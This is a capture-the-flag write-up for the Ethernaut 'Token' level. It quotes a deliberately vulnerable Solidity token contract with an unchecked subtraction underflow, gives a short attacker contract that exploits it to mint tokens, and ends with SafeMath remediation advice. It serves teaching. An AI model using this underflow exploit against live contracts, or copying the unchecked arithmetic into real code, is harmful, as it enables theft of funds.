![Token](/assets/img/BigLevel5.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

The level says:

> The goal of this level is for you to hack the basic token contract below.
> 
> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
>
>  Things that might help:
>
>  - What is an odometer?

And give the following contract's code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

# Solution



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "./Token.sol";

contract Solver {
    Token token;

    constructor(address tokenAddress) public {
        token = Token(tokenAddress);
    }

    function solve(uint _value) public {
        token.transfer(tx.origin, _value);
    }
}

```



![Well done](/assets/img/ethernaut_solved.png)

# Remediation

When performing arithmetic operations in solidity. Always use libraries like OpenZeppelin's [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math) which wraps the arithmetic operations with overflow checks.

# References

- [SWC-101](https://swcregistry.io/docs/SWC-101)